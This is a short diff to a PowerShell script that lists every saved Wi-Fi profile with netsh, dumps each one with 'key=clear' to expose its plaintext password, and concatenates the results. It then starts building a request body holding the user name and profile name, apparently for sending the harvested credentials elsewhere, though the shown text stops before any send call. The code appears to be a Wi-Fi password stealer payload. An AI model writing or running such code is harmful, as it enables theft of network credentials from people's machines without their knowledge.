@@ -1,10 +1,14 @@
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $prof = netsh wlan show profile $wlan key=clear
-	ForEach ($line in $prof) {
-                Write-Host: $line
-		$line = $line.replace('\s','\n')
+	$prof2 = ""
+	
+	ForEach($line in $prof) {
+		$line = $line + "`n"
+		$prof2 = $prof2 + $line
 	}
+
+	$prof = $prof2 + "`n" + "-------------------------"
 
 	$Body = @{
 		'username' = $env:username + " | " + [string]$wlan
